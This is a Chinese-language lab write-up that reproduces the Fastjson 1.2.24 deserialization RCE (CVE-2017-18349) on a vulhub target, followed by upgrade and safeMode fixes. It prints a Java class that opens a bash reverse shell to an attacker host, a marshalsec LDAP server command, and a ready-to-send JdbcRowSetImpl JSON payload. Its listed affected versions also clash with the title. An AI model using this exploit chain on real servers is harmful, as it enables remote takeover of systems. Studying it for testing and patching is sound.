# Fastjson 1.2.24-rce漏洞（CVE-2017-18349）

### 0x00 前言

fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。即fastjson的主要功能就是将Java Bean序列化成JSON字符串，这样得到字符串之后就可以通过数据库等方式进行持久化了。

阿里巴巴公司开源Java开发组件Fastjson存在反序列化漏洞（CVE-2017-18349）。攻击者可利用该漏洞实施任意文件写入、服务端请求伪造等攻击行为，造成服务器权限被窃取、敏感信息泄漏等严重影响。

影响版本：

```
fastjson 1.2.80及之前所有版本
```



### 0x01 环境搭建

这里使用的vulhub的靶场`fastjson/1.2.24-rce`

![image-20230412095028523](https://cdn.jsdelivr.net/gh/lcyunkong/images_map@main/img/image-20230412095028523.png)

环境运行后，访问`http://your-ip:8090`即可看到JSON格式的输出。

### 0x02 漏洞复现

1、准备工具[marshalsec-0.0.3-SNAPSHOT-all.jar]([https://github.com/mbechler/marshalsec])

2、编译并上传命令执行代码`Getshell.java`，生成`Getshell.class`文件

```java
// javac Getshell.java
import java.lang.Runtime;
import java.lang.Process;

public class Getshell {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"bash", "-c", "bash -i >& /dev/tcp/exp_ip/exp_port 0>&1"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```

`exp_ip`: 指接收反弹shell的主机

`exp_port`: 指接收反弹shell的主机的端口

3、打开http服务

```shell
python -m http.server 8080
```

4、利用marshalsec工具，启动一个LDAP服务器，监听9999端口

```shell
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://打开http服务的IP/#Getshell" 9999
```

5、构造数据包，发送到目标服务器，获取shell

```
POST / HTTP/1.1
Host: 192.168.12.130:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 164

{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://启动LDAP服务器的IP:9999/Getshell",
        "autoCommit":true
    }
}
```

![image-20230412114840055](https://cdn.jsdelivr.net/gh/lcyunkong/images_map@main/img/image-20230412114840055.png)

### 0x03 修复建议

1、建议升级到最新版本1.2.83。

2、safeMode加固。Fastjson在1.2.68及之后的版本中引入了safeMode，配置safeMode后，无论白名单和黑名单，都不支持 autoType，可杜绝反序列化Gadgets类变种攻击。

3、升级至Fastjson v2。